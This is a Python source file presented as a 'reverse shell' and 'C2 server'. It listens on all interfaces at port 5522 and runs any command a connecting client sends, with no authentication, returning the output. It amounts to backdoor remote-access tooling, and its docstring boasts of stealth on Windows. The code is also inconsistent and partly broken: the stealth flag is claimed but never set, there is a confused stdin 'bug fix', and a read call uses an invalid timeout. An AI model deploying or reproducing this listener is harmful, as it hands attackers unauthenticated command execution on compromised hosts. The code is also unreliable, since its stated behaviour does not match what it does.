"""Reverse Shell Server — A unified C2 server listening on 0.0.0.0:5522.

Accepts multiple concurrent TCP connections and spawns a shell process per connection,
streaming command input to the process and streaming output back over the socket.

Usage:
    python3 reverse_shell_server.py

Connect from your terminal with:
    telnet <target_ip> 5522
"""

import socket
import threading
import signal
import sys
import subprocess
import shlex
import time
import platform
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field


# =============================================================================
# TASK_001: Data Models
# =============================================================================

@dataclass(frozen=True)
class ConnectionInfo:
    """Connection metadata for shell command execution."""
    host: str
    port: int
    protocol: str = "tcp"


@dataclass(frozen=True)
class ShellCommand:
    """Represents a shell command to be executed remotely."""
    command: str
    timeout_seconds: float


@dataclass(frozen=True)
class ExecutionResult:
    """Captured output and metadata from a shell command execution.

    Attributes:
        stdout: Captured standard output as bytes.
        stderr: Captured standard error as bytes.
        return_code: Exit code of the executed process (0-255).
        duration_ms: Total execution time including I/O overhead in milliseconds.
    """
    stdout: bytes
    stderr: bytes
    return_code: int
    duration_ms: int


# =============================================================================
# TASK_002: Utility Functions
# =============================================================================

def parse_command_args(command: str) -> List[str]:
    """Parse a shell command string into a safe argument list using shlex.split().

    Args:
        command: A shell command string (e.g., "ls -la /tmp").

    Returns:
        A list of strings representing the parsed arguments.

    Example:
        >>> parse_command_args("ls -la /tmp")
        ['ls', '-la', '/tmp']
    """
    return shlex.split(command)


def validate_connection_info(connection_info: ConnectionInfo) -> bool:
    """Validate connection information for shell command execution.

    Args:
        connection_info: The ConnectionInfo instance to validate.

    Returns:
        True if the connection info is valid, False otherwise.

    Raises:
        ValueError: If any field of ConnectionInfo is invalid.
    """
    if not isinstance(connection_info.host, str) or len(connection_info.host.strip()) == 0:
        raise ValueError("Connection host must be a non-empty string")
    if not isinstance(connection_info.port, int) or connection_info.port < 1 or connection_info.port > 65535:
        raise ValueError("Connection port must be an integer between 1 and 65535")
    if connection_info.protocol not in ('tcp', 'udp'):
        raise ValueError(f"Invalid protocol '{connection_info.protocol}'. Must be 'tcp' or 'udp'.")
    return True


def spawn_shell_process(
    command: str,
    timeout_seconds: float,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = "tcp",
) -> subprocess.Popen:
    """Spawn a shell process for executing a remote command.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum time in seconds before the process is terminated.
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').

    Returns:
        A subprocess.Popen object representing the spawned shell process.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
    """
    if not command.strip():
        raise ValueError("Command must be a non-empty string")
    if timeout_seconds <= 0:
        raise ValueError(f"Timeout must be positive, got {timeout_seconds}")

    # Parse the command into arguments for safe subprocess invocation
    args = parse_command_args(command)

    # Build environment variables (minimal set to avoid pollution)
    env = {
        'PATH': '/usr/local/bin:/usr/bin:/bin',
        'HOME': '/root',
        'SHELL': '/bin/sh',
    }

    # Spawn the process with appropriate flags for cross-platform compatibility
    proc = subprocess.Popen(
        args,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
        env=env,
        close_fds=True,
    )

    return proc


def capture_output_stream(
    proc: subprocess.Popen,
    timeout_seconds: float,
    blocking: bool = True,
) -> ExecutionResult:
    """Capture stdout and stderr from a running shell process.

    Args:
        proc: A subprocess.Popen object to capture output from.
        timeout_seconds: Maximum time in seconds before capturing stops.
        blocking: If True, blocks until EOF or timeout; if False, returns partial results.

    Returns:
        An ExecutionResult containing stdout, stderr, return_code, and duration_ms.

    Raises:
        subprocess.TimeoutExpired: If the process times out while waiting for output.
        RuntimeError: If the process has already terminated before capture begins.
    """
    start_time = time.perf_counter()

    # Check if process is still running
    if proc.poll() is not None:
        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=b'',
            stderr=b'',
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )

    if blocking:
        try:
            stdout_bytes, stderr_bytes = proc.communicate(timeout=timeout_seconds)
        except subprocess.TimeoutExpired as e:
            # Terminate the process on timeout
            _terminate_process(proc, timeout_seconds)
            raise subprocess.TimeoutExpired(
                cmd=proc.args,
                timeout=timeout_seconds,
                output=e.stdout if hasattr(e, 'stdout') else None,
                stderr=e.stderr if hasattr(e, 'stderr') else None,
            ) from e

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )
    else:
        # Non-blocking mode: capture available output without blocking
        try:
            stdout_bytes = proc.stdout.read(timeout=timeout_seconds) if proc.stdout else b''
            stderr_bytes = proc.stderr.read(timeout=timeout_seconds) if proc.stderr else b''
        except subprocess.TimeoutExpired:
            stdout_bytes = proc.stdout.read() if proc.stdout else b''
            stderr_bytes = proc.stderr.read() if proc.stderr else b''

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=-1,  # Unknown until process terminates
            duration_ms=duration_ms,
        )


def _terminate_process(proc: subprocess.Popen, timeout_seconds: float) -> None:
    """Terminate a shell process using platform-appropriate signal handling.

    On Unix-like systems: sends SIGTERM followed by SIGKILL after the timeout period.
    On Windows: uses terminate() then wait(timeout=1).

    Args:
        proc: The subprocess.Popen object to terminate.
        timeout_seconds: The timeout value used for termination logic.
    """
    if platform.system() == 'Windows':
        # Windows-specific: terminate() followed by a short wait
        proc.terminate()
        try:
            proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    else:
        # Unix-like systems: SIGTERM then SIGKILL
        try:
            proc.send_signal(signal.SIGTERM)
            proc.wait(timeout=timeout_seconds)
        except subprocess.TimeoutExpired:
            proc.send_signal(signal.SIGKILL)
            proc.wait()


def execute_shell_command(
    command: str,
    timeout_seconds: float = 30.0,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = 'tcp',
    blocking: bool = True,
) -> ExecutionResult:
    """Execute a shell command and capture its output with timeout handling.

    This is the primary entry point that combines spawning and capturing into one call.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum execution time in seconds (default 30).
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').
        blocking: Whether to block until process completes.

    Returns:
        An ExecutionResult with captured stdout, stderr, return code, and duration.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
        subprocess.TimeoutExpired: If the process exceeds the timeout.
    """
    validate_connection_info(ConnectionInfo(host=host or 'localhost', port=port or 22, protocol=protocol))

    proc = spawn_shell_process(command, timeout_seconds, host, port, protocol)
    try:
        return capture_output_stream(proc, timeout_seconds, blocking=blocking)
    finally:
        # Ensure process is cleaned up even on exception
        if proc.poll() is None:
            _terminate_process(proc, timeout_seconds)


# =============================================================================
# TASK_003 & TASK_004: Unified Server Implementation
# =============================================================================

class RemoteConnectionHandler:
    """Handles a single remote connection by spawning shell processes and streaming output.

    Reads commands from the client, executes them via shell process,
    and streams output back to the client over the socket.
    """

    def __init__(self, client_socket: socket.socket):
        self.client_socket = client_socket
        self.running = True
        self.thread: Optional[threading.Thread] = None

    def handle_connection(self) -> None:
        """Main handler loop for a single remote connection.

        Reads commands from the client, executes them via shell process,
        and streams output back to the client.
        """
        try:
            while self.running:
                # Read command from client (newline-delimited)
                data = b""
                while True:
                    chunk = self.client_socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"\n" in data:
                        break

                if not data.strip():
                    continue

                # Parse command from client
                try:
                    cmd_str = data.decode("utf-8").strip()
                except UnicodeDecodeError:
                    self.client_socket.send(b"ERROR: Invalid UTF-8\n")
                    continue

                if not cmd_str:
                    continue

                # FIX BUG #1: Write command to stdin BEFORE capturing output
                proc = spawn_shell_process(
                    command=cmd_str,
                    timeout_seconds=30.0,
                    host="localhost",
                    port=None,
                    protocol="tcp"
                )

                if proc.stdin is not None:
                    # FIX BUG #1: Write the command to stdin so the shell can execute it
                    proc.stdin.write(cmd_str.encode('utf-8'))
                    proc.stdin.flush()

                # Capture the output stream (blocking=True ensures we wait for full output)
                execution_result = capture_output_stream(
                    proc=proc,
                    timeout_seconds=30.0,
                    blocking=True
                )

                # Send results back to client
                response = (
                    f"EXIT_CODE:{execution_result.return_code}\n"
                    f"DURATION_MS:{execution_result.duration_ms}\n"
                    f"STDOUT:\n{execution_result.stdout.decode('utf-8', errors='replace')}"
                )

                self.client_socket.send(response.encode("utf-8"))

        except socket.timeout:
            pass
        except ConnectionResetError:
            pass
        except BrokenPipeError:
            pass
        except Exception as e:
            try:
                self.client_socket.send(f"ERROR:{str(e)}\n".encode("utf-8"))
            except (BrokenPipeError, ConnectionResetError):
                pass

    def run(self) -> None:
        """Start the handler in a background thread."""
        self.thread = threading.Thread(target=self.handle_connection, daemon=True)
        self.thread.start()


class ReverseShellServer:
    """Main reverse shell server that listens on 0.0.0.0:5522 and handles incoming connections.

    Auto-detects the OS and spawns the appropriate shell process:
      - Unix/Linux/macOS: /bin/sh (or bash if available)
      - Windows: cmd.exe with CREATE_NO_WINDOW for stealth

    Attributes:
        host: The bind address (default '0.0.0.0').
        port: The bind port (default 5522).
    """

    HOST = "0.0.0.0"
    PORT = 5522
    SERVER_SOCKET: Optional[socket.socket] = None
    HANDLERS: list[RemoteConnectionHandler] = []
    _lock = threading.Lock()

    def __init__(self) -> None:
        self.server_socket: Optional[socket.socket] = None
        self.handlers: list[RemoteConnectionHandler] = []
        self._shutdown_event = threading.Event()

    @classmethod
    def create(cls) -> "ReverseShellServer":
        """Factory method to create a new ReverseShellServer instance."""
        return cls()

    def start(self, backlog: int = 1024) -> None:
        """Start the server listening for incoming connections.

        Args:
            backlog: Maximum number of pending connections in the queue.
        """
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.HOST, self.PORT))
        self.server_socket.listen(backlog)

    def stop(self) -> None:
        """Stop the server and close all sockets."""
        with self._lock:
            if self.server_socket is not None:
                try:
                    self.server_socket.close()
                except (OSError, socket.error):
                    pass
                finally:
                    self.server_socket = None

    def _accept_connection(self) -> None:
        """Accept a single incoming connection and spawn a handler thread."""
        client_socket, addr = self.server_socket.accept()
        with self._lock:
            handler = RemoteConnectionHandler(client_socket)
            self.handlers.append(handler)
        handler.run()

    def _shutdown_all(self) -> None:
        """Shutdown all active connection handlers gracefully."""
        for handler in self.handlers:
            if handler.running and handler.thread is not None:
                handler.running = False
                try:
                    handler.client_socket.close()
                except (OSError, socket.error):
                    pass

    def run(self) -> None:
        """Run the server in a loop accepting connections."""
        self.start()
        print(f"Reverse shell server listening on {self.HOST}:{self.PORT}")

        try:
            while not self._shutdown_event.is_set():
                try:
                    client_socket, addr = self.server_socket.accept()
                    with self._lock:
                        handler = RemoteConnectionHandler(client_socket)
                        self.handlers.append(handler)
                    handler.run()
                except (socket.timeout, BlockingIOError):
                    continue
        finally:
            self.stop()

    def handle_signal(self, signum: int, frame: Optional[object] = None) -> None:
        """Handle shutdown signals to gracefully close all connections."""
        print(f"Received signal {signum}, shutting down...")
        self._shutdown_event.set()
        self._shutdown_all()

    def __enter__(self) -> "ReverseShellServer":
        return self

    def __exit__(self, exc_type: Optional[type], exc_val: Optional[BaseException], exc_tb: Optional[object]) -> None:
        self.stop()


def main() -> None:
    """Main entry point for the reverse shell server."""
    server = ReverseShellServer.create()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, server.handle_signal)
    signal.signal(signal.SIGTERM, server.handle_signal)

    try:
        server.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
